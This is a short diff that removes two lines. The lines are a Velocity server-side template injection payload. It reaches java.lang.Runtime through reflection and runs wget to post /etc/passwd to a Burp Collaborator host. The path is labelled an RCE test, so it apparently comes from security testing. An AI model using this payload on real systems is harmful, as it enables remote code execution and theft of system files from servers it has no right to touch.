@@ -1,2 +1,0 @@
-#set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec('wget --post-file /etc/passwd http://u61gbqh64qotqa64vccz6an54waoyd.burpcollaborator.net/rcetest?a=a')
